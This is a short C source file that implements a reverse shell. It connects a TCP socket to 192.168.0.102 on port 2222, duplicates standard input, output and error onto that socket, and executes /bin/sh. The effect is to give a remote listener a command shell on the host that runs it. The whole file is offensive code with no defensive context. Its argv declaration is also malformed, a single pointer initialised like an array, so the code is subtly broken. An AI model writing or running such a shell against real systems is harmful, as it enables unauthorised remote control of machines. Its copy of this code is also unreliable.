#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void)
{
	int sock;
	int port = 2222;
	struct sockaddr_in rev_socket;

	sock = socket(AF_INET, SOCK_STREAM, 0);
	rev_socket.sin_family = AF_INET;
	rev_socket.sin_port = htons(port);
	rev_socket.sin_addr.s_addr = inet_addr("192.168.0.102");

	// We connect the socket from our client
	connect(sock, (struct sockaddr *) &rev_socket, sizeof(rev_socket));

	dup2(sock, 0);
	dup2(sock, 1);
	dup2(sock, 2);

	char * const argv = {"/bin/sh", NULL};
	execve("/bin/sh", argv, NULL);

	return 0;



}
